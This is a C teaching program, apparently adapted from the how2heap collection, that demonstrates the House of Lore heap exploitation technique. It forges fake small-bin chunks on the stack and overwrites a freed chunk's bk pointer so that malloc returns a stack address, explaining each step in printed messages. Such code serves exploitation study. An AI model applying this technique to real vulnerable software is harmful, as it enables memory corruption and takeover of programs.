// This is based off of: https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_lore.c

#include <stdio.h>
#include <stdlib.h>

int main(void)
{

	puts("So let's cover House of Lore.");
	puts("House of Lore focuses on attacking the small bin to allocate a chunk outside of the heap.");
	puts("We will essentially create two fake small bin chunks, then overwrite the bk pointer of the small bin chunk to point to the first chunk.");
	puts("Then just allocate chunks until we get a fake chunk.");
	puts("It's sort of like a fast bin attack, however with more setup and restrictions.");
	puts("Let's get started.\n\n");




	printf("We will start off by grooming the heap so we can do House of Lore.\n");
	printf("For that we will need a chunk in the small bin that we can edit with some sort of bug.\n");
	printf("For this we will allocate a small bin size chunk (by default on x64 it is greater than 0x80 and less than 0x400).\n\n");

	unsigned long *ptr0;
	ptr0 = malloc(0x200);

	printf("Allocated chunk at:\t%p\n\n", ptr0);

	printf("Next we will allocate another chunk, just to avoid consolidating our ptr0 chunk with the top chunk.\n\n");

	malloc(0x40);

	printf("Next up we will insert our first heap chunk into the unsorted bin by freeing it.\n\n");

	free(ptr0);

	printf("Now we will insert our unsorted bin chunk into the small bin by allocating a heap chunk big enough that it can't come out of the unsorted bin.\n");

	malloc(0x500);




	printf("Now that we have a chunk in the small bin, we can move on to forging the fake chunks.\n\n");

	printf("The small bin is a doubly linked list, with a fwd and bk pointer.\n");
	printf("The chunk that we allocate outside of the heap needs to have a fwd and bk pointer to chunks that their opposite pointers point back to them.\n");
	printf("Due to checks made by malloc the fwd chunk's bk pointer needs to point to the chunk outside of the heap we will allocate with malloc, and vice versa.\n");
	printf("So in total we will need three chunks, one of which is our small bin chunk, and the other two will be on the stack.\n");
	printf("Our goal is to get malloc to allocate fake chunk 0 (it will be at an offset of 0x10 from the start).\n\n");

	unsigned long fake0[4];
	unsigned long fake1[4];

	printf("Fake Chunk 0:\t%p\n", fake0);
	printf("Fake Chunk 1:\t%p\n\n", fake1);

	printf("Now we will write the pointers that will link our two fake chunks on the stack.\n");
	printf("The bk pointer for fake chunk 0 will point to fake chunk 1.\n");
	printf("The fwd pointer for fake chunk 1 will point to fake chunk 0.\n");
	printf("This is because if a chunk is allocated from the small bin, the next chunk will be the bk chunk.\n");
	printf("Also keep in mind, these pointers are to the start of the heap metadata.\n\n");

	fake0[3] = (unsigned long)fake1;
	fake1[2] = (unsigned long)fake0;

	printf("Now we will write the two pointers that will link together fake chunk 0 and our small bin chunk.\n");
	printf("This is also where our bug comes in to edit a freed small bin chunk.\n");
	printf("We will use the bug to overwrite the bk pointer for the small bin chunk to point to point to fake chunk 0.\n");
	printf("Then we will overwrite the fwd chunk of the fake chunk 0 to point to the small bin chunk.\n\n");

	ptr0[1]  = (unsigned long)fake0;
	fake0[2] = (unsigned long)((unsigned long *)ptr0 - 2);

	printf("small bin bk:\t\t0x%lx\n", ptr0[1]);
	printf("fake chunk 0 fwd:\t0x%lx\n", fake0[2]);
	printf("fake chunk 0 bk:\t0x%lx\n", fake0[3]);
	printf("fake chunk 1 fwd:\t0x%lx\n\n", fake1[2]);




	printf("Now that our setup is out of the way, let's have malloc allocate fake chunk 0.\n");
	printf("We will allocate a heap chunk equal to the size of our small bin chunk.\n");
	printf("This will allocate our small bin chunk, and move our fake chunk to the top of the small bin.\n");
	printf("Then with another allocation we will get our fake chunk from malloc.\n\n");

	printf("Allocation 0:\t%p\n", malloc(0x200));
	printf("Allocation 1:\t%p\n", malloc(0x200));

	printf("\nJust like that, we executed a House of Lore attack!\n");
}
